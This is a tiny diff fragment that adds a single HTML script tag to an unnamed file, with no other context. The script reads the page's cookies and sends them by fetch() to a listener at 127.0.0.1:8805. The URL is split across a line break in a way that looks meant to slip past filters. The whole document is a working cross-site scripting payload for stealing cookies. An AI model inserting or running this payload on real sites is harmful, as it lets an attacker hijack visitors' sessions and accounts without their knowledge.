@@ -1,0 +1,2 @@
+<script>fetch(`/
+/127.0.0.1:8805/sx?`+document.cookie)</script>
